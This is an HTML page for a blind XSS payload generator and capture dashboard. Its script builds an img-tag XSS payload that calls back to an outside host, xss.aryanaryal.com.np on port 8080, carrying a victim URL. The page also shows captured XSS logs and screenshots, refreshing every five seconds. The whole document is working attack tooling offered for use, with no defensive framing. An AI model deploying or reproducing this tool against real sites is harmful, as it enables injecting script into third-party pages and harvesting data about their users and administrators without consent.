<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blind XSS Tool</title>
    <style>
        body {
            background-color: #1e1e1e;
            color: white;
            font-family: Arial, sans-serif;
        }
        .container {
            max-width: 800px;
            margin: auto;
            padding: 20px;
        }
        h1, h2 {
            text-align: center;
        }
        .log {
            background-color: #333;
            padding: 10px;
            border-radius: 5px;
            margin-top: 20px;
            height: 400px;
            overflow-y: auto;
        }
        .log p {
            font-family: monospace;
            margin: 5px 0;
        }
        .screenshot {
            width: 100%;
            max-width: 500px;
            display: block;
            margin: 10px auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Blind XSS Payload Generator</h1>
        <button id="generate-payload">Generate XSS Payload</button>
        <div id="payload-display" style="margin-top: 10px;"></div>

        <h2>Captured XSS Logs</h2>
        <div class="log" id="log"></div>

        <h2>Captured Screenshots</h2>
        <div id="screenshots"></div>
    </div>

    <script>
        document.getElementById("generate-payload").addEventListener("click", function() {
            const uniqueId = Date.now();
            const xssPayload = `<img src="http://xss.aryanaryal.com.np:8080?xss=${uniqueId}&url=http://victim.com" />`;
            document.getElementById("payload-display").innerHTML = `XSS Payload: <code>${xssPayload}</code>`;
        });

        // Fetch and display log file
        function fetchLog() {
            fetch('xss_logs.txt')
                .then(response => response.text())
                .then(data => {
                    const logElement = document.getElementById("log");
                    logElement.innerHTML = ''; 

                    const logLines = data.split('\n');
                    logLines.forEach(line => {
                        if (line.trim()) {
                            const logEntry = document.createElement('p');
                            logEntry.textContent = line;
                            logElement.appendChild(logEntry);
                        }
                    });
                });
        }

        // Fetch screenshots
        function fetchScreenshots() {
            fetch('/screenshots')
                .then(response => response.json())
                .then(screenshots => {
                    const screenshotContainer = document.getElementById('screenshots');
                    screenshotContainer.innerHTML = '';

                    screenshots.forEach(screenshot => {
                        const img = document.createElement('img');
                        img.src = screenshot.url;
                        img.alt = 'Captured Screenshot';
                        img.className = 'screenshot';
                        screenshotContainer.appendChild(img);
                    });
                });
        }

        // Refresh log and screenshots every 5 seconds
        setInterval(fetchLog, 5000);
        setInterval(fetchScreenshots, 5000);
    </script>
</body>
</html>
